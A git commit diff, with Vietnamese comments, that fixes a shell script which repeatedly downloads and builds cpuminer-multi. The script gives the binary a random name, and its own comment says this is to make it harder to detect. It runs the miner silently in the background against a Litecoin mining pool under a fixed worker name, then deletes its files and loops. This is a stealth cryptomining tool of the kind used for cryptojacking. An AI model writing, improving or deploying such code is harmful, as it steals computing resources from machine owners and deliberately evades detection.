37e05ddf43c444ab4b4be029799868d93cfe759f
Quqngdev <hovanquang2001122@gmail.com>
2024-07-12 08:27:52 +0700

    Update bo.sh

--- bo.sh
+++ bo.sh
@@ -10,26 +10,26 @@ while true; do
   # Tải file
   sudo apt-get update
   sudo apt-get upgrade 
-  sudo apt-get install build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev
+  sudo apt-get install -y build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev
 
   git clone -q --no-check-certificate https://github.com/tpruvot/cpuminer-multi.git
   # Giải nén file
-  random_name=$(generate_randomname)
-  mv cpuminer-multi "$randomname"
-  cd "$randomname"
+  random_name=$(generate_random_name)
+  mv cpuminer-multi "$random_name"
+  cd "$random_name"
   
   ./autogen.sh
-CFLAGS="-march=native" ./configure
-make
+  CFLAGS="-march=native" ./configure
+  make
 
   ./build.sh
 
   # Đổi tên file để khó phát hiện hơn
-  random_name=$(generate_random_name)
-  mv cpuminer "$random_name"
+  random_name_exec=$(generate_random_name)
+  mv cpuminer "$random_name_exec"
 
   # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
-  nohup ./"$random_name" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
+  nohup ./"$random_name_exec" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
   miner_pid=$!
 
   # Ngủ trong 5 phút
@@ -39,10 +39,9 @@ make
   kill $miner_pid
 
   # Xóa các file đã tải và giải nén
-  
-  rm -rf "$randomname"
+  cd ..
   rm -rf "$random_name"
 
   # Nghỉ 3 phút trước khi lặp lại
-  sleep 60
+  sleep 180
 done
